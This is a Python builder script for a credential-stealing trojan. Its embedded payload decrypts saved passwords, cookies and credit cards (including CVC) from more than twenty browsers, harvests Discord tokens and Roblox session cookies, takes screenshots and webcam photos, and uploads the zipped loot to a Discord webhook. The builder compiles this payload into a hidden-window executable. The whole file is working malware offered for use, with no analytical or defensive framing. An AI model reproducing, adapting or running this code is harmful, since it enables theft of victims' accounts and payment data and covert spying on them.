# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('
')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '
'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('
')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)
        
        result = []
        color_index = 0
        
        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"[38;2;{r};{g};{b}m{char}"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)
        
        return '
'.join(result) + "[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

PAYLOAD_CODE = '''import os
import sys
import sqlite3
import json
import base64
import shutil
from datetime import datetime
import glob
import re
import requests
import ctypes
import zipfile
import time
import hashlib
import platform
import subprocess
import socket
import psutil
import random

if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

try:
    import win32crypt
    DPAPI_OK = True
except:
    DPAPI_OK = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    CRYPTO_OK = True
except:
    CRYPTO_OK = False

try:
    from PIL import ImageGrab
    SCREENSHOT_OK = True
except:
    SCREENSHOT_OK = False

try:
    import cv2
    WEBCAM_OK = True
except:
    WEBCAM_OK = False


class AntiBanStealer:
    def __init__(self):
        self.browsers = {
            'Chrome': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data'),
                'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
            },
            'Edge': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data'),
                'profiles': ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
            },
            'Brave': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                'profiles': ['Default', 'Profile 1', 'Profile 2']
            },
            'Opera': {
                'path': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera Stable'),
                'profiles': ['']
            },
            'OperaGX': {
                'path': os.path.join(os.environ.get('APPDATA', ''), 'Opera Software', 'Opera GX Stable'),
                'profiles': ['']
            },
            'Vivaldi': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Vivaldi', 'User Data'),
                'profiles': ['Default', 'Profile 1']
            },
            'Yandex': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Yandex', 'YandexBrowser', 'User Data'),
                'profiles': ['Default', 'Profile 1']
            },
            'CocCoc': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CocCoc', 'Browser', 'User Data'),
                'profiles': ['Default', 'Profile 1']
            },
            'Chromium': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Chromium', 'User Data'),
                'profiles': ['Default', 'Profile 1']
            },
            'Torch': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Torch', 'User Data'),
                'profiles': ['Default']
            },
            'Comodo': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Comodo', 'Dragon', 'User Data'),
                'profiles': ['Default']
            },
            'Slimjet': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Slimjet', 'User Data'),
                'profiles': ['Default']
            },
            '360Browser': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), '360Browser', 'Browser', 'User Data'),
                'profiles': ['Default']
            },
            'Maxthon': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Maxthon3', 'User Data'),
                'profiles': ['Default']
            },
            'Iridium': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Iridium', 'User Data'),
                'profiles': ['Default']
            },
            'UCBrowser': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'UCBrowser', 'User Data'),
                'profiles': ['Default']
            },
            'Cent': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'CentBrowser', 'User Data'),
                'profiles': ['Default']
            },
            '7Star': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), '7Star', '7Star', 'User Data'),
                'profiles': ['Default']
            },
            'Sputnik': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Sputnik', 'Sputnik', 'User Data'),
                'profiles': ['Default']
            },
            'Epic': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Epic Privacy Browser', 'User Data'),
                'profiles': ['Default']
            },
            'Uran': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'uCozMedia', 'Uran', 'User Data'),
                'profiles': ['Default']
            },
            'Liebao': {
                'path': os.path.join(os.environ.get('LOCALAPPDATA', ''), 'liebao', 'User Data'),
                'profiles': ['Default']
            },
            'Firefox': {
                'path': os.path.join(os.environ.get('APPDATA', ''), 'Mozilla', 'Firefox', 'Profiles'),
                'profiles': []
            }
        }
        
        self.data = {
            'cookies': [],
            'passwords': [],
            'cards': [],
            'tokens': [],
            'roblox': []
        }
        
        self.stats = {
            'browsers_found': 0,
            'total_cookies': 0,
            'total_passwords': 0,
            'total_cards': 0,
            'total_tokens': 0,
            'total_roblox': 0
        }
        
        self.pc_info = {}
        self.session_id = ''.join([str(hash(datetime.now().timestamp()))[i] for i in range(8)])
        self.temp_dir = os.path.join(os.environ.get('TEMP', ''), f'_s{self.session_id}')
        os.makedirs(self.temp_dir, exist_ok=True)

    def get_master_key(self, browser_path):
        try:
            local_state = os.path.join(browser_path, 'Local State')
            if not os.path.exists(local_state):
                return None
            with open(local_state, 'r', encoding='utf-8') as f:
                local_state_data = json.load(f)
            encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_value(self, encrypted_value, master_key):
        try:
            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                nonce = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                cipher = AESGCM(master_key)
                return cipher.decrypt(nonce, ciphertext + tag, None).decode('utf-8', errors='ignore')
            else:
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except:
            return ""

    def grab_chromium_cookies(self, browser_name, profile_path):
        cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(profile_path, 'Cookies')
        if not os.path.exists(cookies_path):
            return
        
        temp_db = os.path.join(self.temp_dir, f'c_{browser_name}_{self.session_id}.tmp')
        try:
            shutil.copy2(cookies_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
            rows = cursor.fetchall()
            master_key = self.get_master_key(os.path.dirname(profile_path))
            
            for host, name, value, encrypted_value in rows:
                decrypted = value
                if encrypted_value and master_key:
                    decrypted = self.decrypt_value(encrypted_value, master_key)
                
                self.data['cookies'].append({
                    'browser': browser_name,
                    'host': host,
                    'name': name,
                    'value': decrypted
                })
                self.stats['total_cookies'] += 1
            
            conn.close()
            os.remove(temp_db)
        except:
            pass

    def grab_chromium_passwords(self, browser_name, profile_path):
        login_data = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(login_data):
            return
        
        temp_db = os.path.join(self.temp_dir, f'l_{browser_name}_{self.session_id}.tmp')
        try:
            shutil.copy2(login_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            rows = cursor.fetchall()
            master_key = self.get_master_key(os.path.dirname(profile_path))
            
            for url, username, encrypted_password in rows:
                password = ""
                if encrypted_password and master_key:
                    password = self.decrypt_value(encrypted_password, master_key)
                
                if username or password:
                    self.data['passwords'].append({
                        'browser': browser_name,
                        'url': url,
                        'username': username,
                        'password': password
                    })
                    self.stats['total_passwords'] += 1
            
            conn.close()
            os.remove(temp_db)
        except:
            pass

    def grab_chromium_cards(self, browser_name, profile_path):
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return
        
        temp_db = os.path.join(self.temp_dir, f'w_{browser_name}_{self.session_id}.tmp')
        try:
            shutil.copy2(web_data, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            try:
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
            except:
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            
            rows = cursor.fetchall()
            master_key = self.get_master_key(os.path.dirname(profile_path))
            
            for row in rows:
                name = row[0]
                month = row[1]
                year = row[2]
                encrypted_number = row[3]
                
                number = ""
                if encrypted_number and master_key:
                    number = self.decrypt_value(encrypted_number, master_key)
                
                cvc = ""
                try:
                    cursor.execute("SELECT value_encrypted FROM local_card_data WHERE guid = (SELECT guid FROM credit_cards WHERE name_on_card = ?)", (name,))
                    cvc_row = cursor.fetchone()
                    if cvc_row and cvc_row[0] and master_key:
                        cvc = self.decrypt_value(cvc_row[0], master_key)
                except:
                    pass
                
                if name or number:
                    self.data['cards'].append({
                        'browser': browser_name,
                        'name': name,
                        'number': number,
                        'exp_month': month,
                        'exp_year': year,
                        'cvc': cvc if cvc else 'N/A'
                    })
                    self.stats['total_cards'] += 1
            
            conn.close()
            os.remove(temp_db)
        except:
            pass

    def grab_chromium_tokens(self, browser_name, profile_path):
        localstorage_path = os.path.join(profile_path, 'Local Storage', 'leveldb')
        if not os.path.exists(localstorage_path):
            return
        
        token_patterns = [
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
            r'mfa\.[\w-]{84}',
            r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}'
        ]
        
        for file_path in glob.glob(os.path.join(localstorage_path, '*.ldb')):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                for pattern in token_patterns:
                    tokens = re.findall(pattern, content)
                    for token in tokens:
                        if token not in [t['token'] for t in self.data['tokens']]:
                            self.data['tokens'].append({
                                'browser': browser_name,
                                'token': token
                            })
                            self.stats['total_tokens'] += 1
            except:
                pass

    def grab_roblox_cookies(self):
        for browser_name, browser_info in self.browsers.items():
            if browser_name == 'Firefox':
                continue
            
            browser_path = browser_info['path']
            if not os.path.exists(browser_path):
                continue
            
            for profile_name in browser_info['profiles']:
                profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
                if not os.path.exists(profile_path):
                    continue
                
                cookies_path = os.path.join(profile_path, 'Network', 'Cookies')
                if not os.path.exists(cookies_path):
                    cookies_path = os.path.join(profile_path, 'Cookies')
                if not os.path.exists(cookies_path):
                    continue
                
                temp_db = os.path.join(self.temp_dir, f'r_{browser_name}_{self.session_id}.tmp')
                try:
                    shutil.copy2(cookies_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT name, value, encrypted_value FROM cookies WHERE host_key LIKE '%.roblox.com%'")
                    rows = cursor.fetchall()
                    master_key = self.get_master_key(os.path.dirname(profile_path))
                    
                    for name, value, encrypted_value in rows:
                        decrypted = value
                        if encrypted_value and master_key:
                            decrypted = self.decrypt_value(encrypted_value, master_key)
                        
                        if name == '.ROBLOSECURITY' and decrypted:
                            self.data['roblox'].append({
                                'browser': browser_name,
                                'cookie': decrypted
                            })
                            self.stats['total_roblox'] += 1
                    
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass

    def get_pc_info(self):
        try:
            self.pc_info = {
                'hostname': socket.gethostname(),
                'pc_name': os.environ.get('COMPUTERNAME', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'platform': platform.system(),
                'version': platform.version(),
                'processor': platform.processor(),
                'ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                'hwid': self.get_hwid()
            }
            
            try:
                uptime_seconds = time.time() - psutil.boot_time()
                uptime_hours = uptime_seconds / 3600
                self.pc_info['uptime'] = f"{uptime_hours:.1f} hours"
            except:
                self.pc_info['uptime'] = "Unknown"
        except:
            pass

    def get_hwid(self):
        try:
            if sys.platform == "win32":
                hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
                return hwid
            return "N/A"
        except:
            return "Unknown"

    def take_screenshot(self):
        try:
            if SCREENSHOT_OK:
                screenshot = ImageGrab.grab()
                screenshot_path = os.path.join(self.temp_dir, 'screenshot.png')
                screenshot.save(screenshot_path)
                return screenshot_path
            return None
        except:
            return None

    def take_webcam_photo(self):
        try:
            if WEBCAM_OK:
                cam = cv2.VideoCapture(0)
                time.sleep(1)
                ret, frame = cam.read()
                if ret:
                    webcam_path = os.path.join(self.temp_dir, 'webcam.png')
                    cv2.imwrite(webcam_path, frame)
                    cam.release()
                    return webcam_path
                cam.release()
            return None
        except:
            return None

    def grab_all_browsers(self):
        for browser_name, browser_info in self.browsers.items():
            browser_path = browser_info['path']
            if not os.path.exists(browser_path):
                continue
            
            self.stats['browsers_found'] += 1
            
            if browser_name == 'Firefox':
                try:
                    for profile_dir in os.listdir(browser_path):
                        profile_path = os.path.join(browser_path, profile_dir)
                        if os.path.isdir(profile_path):
                            pass
                except:
                    pass
            else:
                for profile_name in browser_info['profiles']:
                    profile_path = os.path.join(browser_path, profile_name) if profile_name else browser_path
                    if not os.path.exists(profile_path):
                        continue
                    
                    self.grab_chromium_cookies(browser_name, profile_path)
                    self.grab_chromium_passwords(browser_name, profile_path)
                    self.grab_chromium_cards(browser_name, profile_path)
                    self.grab_chromium_tokens(browser_name, profile_path)

    def create_txt_files(self):
        pc_info_content = f"""================================
       PC INFORMATION
================================

PC Name      : {self.pc_info.get('pc_name', 'Unknown')}
Username     : {self.pc_info.get('username', 'Unknown')}
Hostname     : {self.pc_info.get('hostname', 'Unknown')}
Platform     : {self.pc_info.get('platform', 'Unknown')}
Version      : {self.pc_info.get('version', 'Unknown')}
Processor    : {self.pc_info.get('processor', 'Unknown')}
RAM          : {self.pc_info.get('ram', 'Unknown')}
HWID         : {self.pc_info.get('hwid', 'Unknown')}
Uptime       : {self.pc_info.get('uptime', 'Unknown')}

Session ID   : {self.session_id}
Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

================================
"""
        
        passwords_content = "================================\n"
        passwords_content += "       PASSWORDS\n"
        passwords_content += "================================\n\n"
        
        for pwd in self.data['passwords']:
            passwords_content += f"Browser  : {pwd['browser']}\n"
            passwords_content += f"URL      : {pwd['url']}\n"
            passwords_content += f"Username : {pwd['username']}\n"
            passwords_content += f"Password : {pwd['password']}\n"
            passwords_content += "-" * 50 + "\n\n"
        
        cards_content = "================================\n"
        cards_content += "       CREDIT CARDS\n"
        cards_content += "================================\n\n"
        
        for card in self.data['cards']:
            cards_content += f"Browser    : {card['browser']}\n"
            cards_content += f"Name       : {card['name']}\n"
            cards_content += f"Number     : {card['number']}\n"
            cards_content += f"Expiration : {card['exp_month']}/{card['exp_year']}\n"
            cards_content += f"CVC        : {card.get('cvc', 'N/A')}\n"
            cards_content += "-" * 50 + "\n\n"
        
        discord_content = "================================\n"
        discord_content += "       DISCORD TOKENS\n"
        discord_content += "================================\n\n"
        
        for token in self.data['tokens']:
            discord_content += f"Browser : {token['browser']}\n"
            discord_content += f"Token   : {token['token']}\n"
            discord_content += "-" * 50 + "\n\n"
        
        cookies_content = "================================\n"
        cookies_content += "       COOKIES\n"
        cookies_content += "================================\n\n"
        
        for cookie in self.data['cookies'][:200]:
            cookies_content += f"{cookie['browser']} | {cookie['host']} | {cookie['name']} | {cookie['value'][:50]}\n"
        
        browsers_content = f"""================================
       BROWSERS SUMMARY
================================

Browsers Found : {self.stats['browsers_found']}
Total Cookies  : {self.stats['total_cookies']}
Total Passwords: {self.stats['total_passwords']}
Total Cards    : {self.stats['total_cards']}
Discord Tokens : {self.stats['total_tokens']}
Roblox Cookies : {self.stats['total_roblox']}

================================
"""
        
        return {
            'pc_info.txt': pc_info_content,
            'passwords.txt': passwords_content,
            'credit_cards.txt': cards_content,
            'discord.txt': discord_content,
            'cookies.txt': cookies_content,
            'browsers.txt': browsers_content
        }

    def create_zip_package(self):
        zip_path = os.path.join(self.temp_dir, f'{self.session_id}.zip')
        
        try:
            txt_files = self.create_txt_files()
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
                for filename, content in txt_files.items():
                    zip_file.writestr(filename, content)
                
                screenshot_path = self.take_screenshot()
                if screenshot_path and os.path.exists(screenshot_path):
                    zip_file.write(screenshot_path, 'screenshot.png')
                
                webcam_path = self.take_webcam_photo()
                if webcam_path and os.path.exists(webcam_path):
                    zip_file.write(webcam_path, 'webcam.png')
            
            return zip_path
        except:
            return None

    def send_to_webhook(self, zip_path):
        try:
            webhook_url = "YOUR_WEBHOOK_URL_HERE"
            
            delay = random.uniform(2.0, 5.0)
            time.sleep(delay)
            
            with open(zip_path, 'rb') as f:
                zip_data = f.read()
            
            file_size_mb = len(zip_data) / (1024 * 1024)
            if file_size_mb > 24:
                return False
            
            files = {'file': (f'{self.session_id}.zip', zip_data, 'application/zip')}
            
            embed_content = f"**Session {self.session_id}**\n\n"
            embed_content += f"**PC**\n{self.pc_info.get('pc_name', 'Unknown')}\n\n"
            embed_content += f"**User**\n{self.pc_info.get('username', 'Unknown')}\n\n"
            embed_content += f"**Browsers**\n{self.stats['browsers_found']}\n\n"
            embed_content += f"**Cookies**\n{self.stats['total_cookies']}\n\n"
            embed_content += f"**Passwords**\n{self.stats['total_passwords']}\n\n"
            embed_content += f"**Cards**\n{self.stats['total_cards']}\n\n"
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            embed = {
                "embeds": [{
                    "description": embed_content,
                    "color": 5814783,
                    "footer": {"text": f"ID: {self.session_id} | {timestamp}"}
                }]
            }
            
            data = {'payload_json': json.dumps(embed)}
            
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]
            
            headers = {
                'User-Agent': random.choice(user_agents),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            }
            
            max_retries = 3
            retry_count = 0
            
            while retry_count < max_retries:
                try:
                    response = requests.post(webhook_url, files=files, data=data, headers=headers, timeout=30)
                    
                    if response.status_code == 204 or response.status_code == 200:
                        return True
                    elif response.status_code == 429:
                        retry_after = 5
                        try:
                            retry_data = response.json()
                            retry_after = int(retry_data.get('retry_after', 5))
                        except:
                            pass
                        
                        wait_time = retry_after + random.uniform(1.0, 3.0)
                        time.sleep(wait_time)
                        retry_count += 1
                    else:
                        retry_count += 1
                        if retry_count < max_retries:
                            time.sleep(random.uniform(3.0, 6.0))
                except requests.exceptions.RequestException:
                    retry_count += 1
                    if retry_count < max_retries:
                        time.sleep(random.uniform(3.0, 6.0))
            
            return False
        except:
            return False

    def cleanup(self):
        try:
            shutil.rmtree(self.temp_dir, ignore_errors=True)
        except:
            pass

    def run(self):
        try:
            self.get_pc_info()
            self.grab_all_browsers()
            self.grab_roblox_cookies()
            
            zip_path = self.create_zip_package()
            if zip_path:
                self.send_to_webhook(zip_path)
            
            self.cleanup()
        except:
            pass


def main():
    try:
        stealer = AntiBanStealer()
        stealer.run()
    except:
        pass


if __name__ == "__main__":
    main()
'''

def main():
    clear_screen()
    
    ascii_art = """
███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    """
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print("
")
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, "Webhook : "))
    w = input().strip()
    
    if not w.startswith('https://discord.com/api/webhooks/'):
        Write(Colorate.Horizontal(Colors.green_to_cyan, '
Webhook invalide!
'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'grabber'
    
    c = PAYLOAD_CODE.replace('YOUR_WEBHOOK_URL_HERE', w)
    
    os.makedirs('output', exist_ok=True)
    t = f'output/{n}_temp.py'
    e = f'output/{n}.exe'
    
    print()
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Creation du payload...
'))
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(c)
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Compilation en cours...
'))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '
PyInstaller non installe!
'))
        Write(Colorate.Horizontal(Colors.green_to_cyan, 'Installez avec: pip install pyinstaller
'))
        sys.exit()
    
    r = subprocess.run([
        'pyinstaller',
        '--onefile',
        '--windowed',
        '--hidden-import', 'sqlite3',
        '--hidden-import', 'cryptography',
        '--hidden-import', 'cryptography.hazmat.primitives.ciphers.aead',
        '--hidden-import', 'win32crypt',
        '--hidden-import', 'psutil',
        '--hidden-import', 'PIL',
        '--hidden-import', 'cv2',
        '--collect-all', 'PIL',
        '--collect-all', 'cv2',
        '--noconfirm',
        '--clean',
        t
    ], capture_output=True, text=True)
    
    if r.returncode != 0:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '
Erreur de compilation!
'))
        print(r.stderr[:500])
        sys.exit()
    
    shutil.move(f'dist/{n}_temp.exe', e)
    
    for p in [t, f'{n}_temp.spec', 'build', 'dist', '__pycache__']:
        try:
            os.remove(p) if os.path.isfile(p) else shutil.rmtree(p, ignore_errors=True)
        except:
            pass
    
    print()
    success_banner = "══════════════════════════════════════════════════════════════════════
                         COMPILATION REUSSIE!
══════════════════════════════════════════════════════════════════════"
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(success_banner)))
    print("
")
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Fichier : output/{n}.exe
"))
    Write(Colorate.Horizontal(Colors.green_to_cyan, f"Webhook : {w[:50]}...
"))
    print()

if __name__ == "__main__":
    main()
